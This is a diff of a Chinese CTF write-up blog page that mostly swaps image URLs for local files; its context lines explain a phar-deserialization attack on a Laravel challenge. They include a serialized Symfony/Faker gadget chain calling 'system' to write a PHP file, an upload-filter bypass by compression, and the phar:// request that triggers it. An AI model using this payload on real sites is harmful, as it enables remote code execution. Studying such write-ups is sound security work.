@@ -48,7 +48,7 @@
         content="2021-04-29">
       <meta
         property="og:article:modified_time"
-        content="2021-04-30">
+        content="2021-05-17">
       <meta
         property="og:article:author"
         content="Switch">
@@ -482,7 +482,7 @@
 
 <p>在 <code>_openImage</code> 方法中，<code>getimagesize</code> 函数会打开一个文件</p>
 <p>而且在 PHP 4.0.5 支持后支持通过 URL 打开</p>
-<p><img src="http://image-bed.liki.link/20210430115828.png" alt="image-20210430115117710" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://image-bed.liki.link/20210430115828.png" class="lozad post-image"></p>
+<p><img src="image-20210430115828.png" alt="image-20210430115828" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430115828.png" class="lozad post-image"></p>
 <p>于是这里我们就可以夹带私货了，比如说 <code>phar://</code></p>
 <h3 id="修洞"><a href="#修洞" class="headerlink" title="修洞"></a>修洞</h3><p>先看路由 <code>routes/web.php</code></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -559,7 +559,7 @@
 <p>但我们无法控制他的返回值，即无法控制 <code>$res</code></p>
 <p>另一个参数 <code>$name</code> 是不可控的，且值为 <code>addCollection</code></p>
 <p>另外我们为了触发一次 <code>call_user_func</code>，这里选择将 <code>$this-&gt;MaxRetries</code> 置为 1 即可</p>
-<p><img src="http://image-bed.liki.link/image-20210430163442769.png" alt="image-20210430163442769" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://image-bed.liki.link/image-20210430163442769.png" class="lozad post-image"></p>
+<p><img src="image-20210430163442769.png" alt="image-20210430163442769" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430163442769.png" class="lozad post-image"></p>
 <h3 id="DefaultGenerator-类"><a href="#DefaultGenerator-类" class="headerlink" title="DefaultGenerator 类"></a>DefaultGenerator 类</h3><p>我们再看到 <code>Faker</code> 中的类 <code>DefaultGenerator</code></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># vendor/fakephp/faker/src/Faker/DefaultGenerator.php</span>
 
@@ -629,14 +629,14 @@
 <h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h3><p>phar 反序列化是 BlackHat 2018 公布的一种不需要 <code>unserialize</code> 函数就能触发反序列化的方法</p>
 <p>因为百度出来的复制来复制去都是那几篇文章，这里附一份 <a target="_blank" rel="noopener" href="https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf">BlackHat 2018 的讲义</a></p>
 <p>PHAR 文件是 PHP Archieve 的缩写，也就是类似于 Java 的 JAR 包的一种压缩文件</p>
-<p><img src="http://image-bed.liki.link/20210430120902.png" alt="image-20210430120822721" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://image-bed.liki.link/20210430120902.png" class="lozad post-image"></p>
+<p><img src="image-20210430120902.png" alt="image-20210430120902" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430120902.png" class="lozad post-image"></p>
 <p>PHP 在读取 PHAR 文件的时候会对 <code>.phar/.metadata.bin</code> 中的内容进行反序列化</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"># exp1.phar.tar.gz/.phar/.metadata.bin
 
 O:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":1:&#123;s:72:" Symfony\Component\Routing\Loader\Configurator\ImportConfigurator parent";O:20:"Faker\ValidGenerator":3:&#123;s:12:" * generator";O:22:"Faker\DefaultGenerator":1:&#123;s:10:" * default";s:34:"echo "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>" > 1.php";&#125;s:12:" * validator";s:6:"system";s:13:" * maxRetries";i:1;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>而 <code>.phar/stub.php</code> 是 PHAR 文件的一个标志，即 <code>__HALT_COMPILER(); ?&gt;</code></p>
-<p><img src="http://image-bed.liki.link/20210430121227.png" alt="image-20210430121218737" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://image-bed.liki.link/20210430121227.png" class="lozad post-image"></p>
+<p><img src="image-20210430121227.png" alt="image-20210430121227" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430121227.png" class="lozad post-image"></p>
 <p>PHP 不会理会这个标志前面是什么东西，他只管把这个标志后面的部分作为 PHAR 包来解析</p>
 <p><code>test.txt</code> 是随便一个什么东西，是一个为了完成压缩而随意构造的东西，PHAR 反序列化的重点也不在这里 2333</p>
 <p>因此只要 PHP 能以 <code>phar://</code> 协议读取这个文件，我们的目的就达到了</p>
@@ -686,18 +686,18 @@ O:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":1:&#123;
 
 <p>因为上传文件有对 stub 和 php 的过滤，加一行语句压缩一下就能过</p>
 <p>压缩后的文件内容</p>
-<p><img src="http://image-bed.liki.link/20210430121617.png" alt="image-20210430121546186" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://image-bed.liki.link/20210430121617.png" class="lozad post-image"></p>
+<p><img src="image-20210430121617.png" alt="image-20210430121617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430121617.png" class="lozad post-image"></p>
 <p>足够抽象了吧 233</p>
 <p>生成出来的 <code>exp1.phar.tar.gz</code>，改名为 <code>exp1.png</code></p>
 <p><strong>P.S. 因为 PHP 8 在遇到异常的时候会作为错误处理，停止执行代码</strong></p>
 <p><strong>所以如果题目环境是 PHP 8 好像是打不通的 (我是 Manjaro 神教，被坑了不短时间 2333)</strong></p>
-<p><img src="http://image-bed.liki.link/20210429190751.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://image-bed.liki.link/20210429190751.png" class="lozad post-image"></p>
+<p><img src="image-20210429190751.png" alt="image-20210429190751" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190751.png" class="lozad post-image"></p>
 <p>上传文件，然后访问路由 <code>/index.php/image?image=phar://./uploads/xxxxxxx.png</code></p>
-<p><img src="http://image-bed.liki.link/20210429190759.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://image-bed.liki.link/20210429190759.png" class="lozad post-image"></p>
-<p><img src="http://image-bed.liki.link/20210429190813.png" alt="3" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://image-bed.liki.link/20210429190813.png" class="lozad post-image"></p>
+<p><img src="image-20210429190759.png" alt="image-20210429190759" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190759.png" class="lozad post-image"></p>
+<p><img src="image-20210429190813.png" alt="image-20210429190813" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190813.png" class="lozad post-image"></p>
 <p>会返回 500 错误，我开了 Laravel DEBUG 所以页面上有详细信息</p>
 <p>但是 phar 反序列化已经执行了，所以会在 <code>public</code> 目录生成一个 <code>1.php</code></p>
-<p><img src="http://image-bed.liki.link/20210429190820.png" alt="4" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://image-bed.liki.link/20210429190820.png" class="lozad post-image"></p>
+<p><img src="image-20210429190820.png" alt="image-20210429190820" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190820.png" class="lozad post-image"></p>
 <p>访问 <code>/1.php</code> 即可</p>
 
   </div>
